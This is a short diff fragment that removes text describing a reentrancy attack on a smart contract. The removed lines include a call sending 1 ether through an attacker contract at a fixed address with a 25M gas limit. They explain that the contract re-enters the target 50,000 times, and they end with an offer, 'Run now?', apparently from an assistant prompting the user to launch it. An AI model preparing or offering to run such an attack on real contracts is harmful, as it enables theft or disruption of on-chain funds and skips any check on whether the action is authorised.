@@ -1,8 +1,0 @@
-Sending ETH to a contract that will consume all gas via a reentrancy loop:
-
-await attacker.attack{value: 1 ether}(
-    0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0Bf,
-    { gasLimit: 25_000_000 }
-);
-
-The attack contract at 0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0Bf will re-enter the target 50k times until gas is exhausted. You'll pay ~25M gas even if all calls revert. Run now?
